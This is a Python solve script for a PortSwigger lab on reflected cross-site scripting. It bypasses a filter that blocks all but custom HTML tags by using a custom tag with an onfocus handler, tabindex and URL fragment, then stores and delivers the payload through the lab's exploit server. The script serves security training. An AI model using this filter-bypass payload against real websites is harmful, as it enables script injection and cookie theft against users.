#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS into HTML context with all tags blocked except custom ones
Delivers a custom-tag payload with onfocus + tabindex + #fragment via the exploit server.
"""

import argparse
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 15: All tags blocked except custom ones"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    parser.add_argument("exploit_server", help="Exploit server URL (e.g. https://exploit-0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    exploit = args.exploit_server.rstrip("/")
    s = requests.Session()
    s.verify = False

    # Step 1: Confirm custom tags pass the WAF
    r = s.get(f"{lab}/?search=<xss>")
    if r.status_code != 200:
        print(f"[-] Custom tag <xss> blocked (status {r.status_code})")
        sys.exit(1)
    print("[+] Custom tag <xss> passes the WAF")

    # Step 2: Build and deliver the exploit
    poc = (
        "<script>\n"
        f"location = '{lab}/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';\n"
        "</script>"
    )
    print(f"[+] Exploit payload:\n{poc}")

    def exploit_action(action):
        return s.post(f"{exploit}/", data={
            "urlIsHttps": "true",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "responseBody": poc,
            "formAction": action,
        })

    exploit_action("STORE")
    print("[+] Exploit stored on exploit server")

    exploit_action("DELIVER_TO_VICTIM")
    print("[+] Exploit delivered to victim")

    # Step 3: Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Check lab page — may take a moment for the victim to visit")


if __name__ == "__main__":
    main()
